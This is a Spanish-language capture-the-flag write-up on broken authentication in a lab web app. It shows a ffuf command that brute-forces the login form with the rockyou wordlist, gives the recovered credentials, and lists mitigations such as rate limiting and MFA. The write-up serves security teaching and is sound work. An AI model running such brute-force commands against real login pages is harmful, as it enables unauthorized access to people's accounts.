# A2 - Broken Authentication (Brute Force)

Vulnerabilidad del OWASP Top 10 (2017). El formulario de login no tiene rate limiting ni bloqueo de intentos, permitiendo adivinar credenciales por fuerza bruta. El propio formulario da una pista del usuario a través de una imagen de Marvin.

---

## Pasos para obtener la flag

### 1. Identificar el vector

El login se realiza mediante GET con esta estructura:
```
http://<IP>/?page=signin&username={username}&password={password}&Login=Login#
```

La imagen de Marvin en el formulario sugiere el usuario: `marvin`.

### 2. Fuerza bruta con ffuf

Usando el diccionario `rockyou.txt`, todos los intentos devuelven HTTP 200, por lo que se filtra por tamaño de respuesta (`-fs`) para identificar el login correcto:

```bash
ffuf -w rockyou.txt \
     -u "http://<IP>/?page=signin&username=marvin&password=FUZZ&Login=Login" \
     -fs 1990
```

La contraseña válida es: **`shadow`**

### 3. Acceder y obtener la flag

Credenciales:
- **Username:** `marvin`
- **Password:** `shadow`

Iniciar sesión → la aplicación muestra la **flag**.

---

## Impacto

- **Credenciales débiles/predecibles:** usuario deducible desde la interfaz y contraseña en diccionario común.
- **Sin rate limiting:** permite miles de intentos sin restricción.
- **Sin bloqueo progresivo:** no hay defensa contra intentos repetidos.

---

## Mitigación

1. **Rate limiting:** limitar intentos de login por IP/usuario en una ventana temporal.
2. **Bloqueo progresivo:** backoff o lockout tras varios intentos fallidos.
3. **Política de contraseñas robusta:** prohibir contraseñas comunes o presentes en diccionarios filtrados.
4. **MFA:** reducir el impacto aunque se comprometa la contraseña.
5. **No revelar usuarios en la interfaz:** evitar pistas visuales o textos que indiquen usuarios válidos.
6. **Logging y alertas:** detectar y alertar sobre intentos masivos de login.
